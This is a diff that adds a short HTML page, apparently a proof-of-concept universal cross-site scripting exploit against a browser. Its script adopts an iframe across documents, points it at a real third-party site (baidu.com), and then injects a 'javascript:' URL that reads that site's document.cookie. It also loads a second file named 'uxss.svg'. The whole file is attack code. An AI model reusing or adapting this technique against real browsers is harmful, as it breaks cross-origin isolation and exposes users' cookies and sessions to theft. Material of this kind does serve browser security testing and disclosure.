@@ -1,0 +1,27 @@
+<html>
+<head>
+<script>
+main = function()
+{
+    specialFrame = document.body.appendChild(document.createElement("iframe"));
+ 
+    document.adoptNode(specialFrame);
+    document.implementation.createHTMLDocument().adoptNode(specialFrame);
+ 
+    specialFrame.contentWindow.location = "http://www.baidu.com/";
+ 
+    interval1 = setInterval(function() {
+        if (specialFrame.contentDocument)
+            return;
+        clearInterval(interval1);
+ 
+        specialFrame.src = "javascript:alert(document.cookie)";
+ 
+        uxssFrame = document.body.appendChild(document.createElement("iframe"));
+        uxssFrame.src = "uxss.svg";
+    }, 100);
+}
+</script>
+</head>
+<body onload="main()"></body>
+</html>
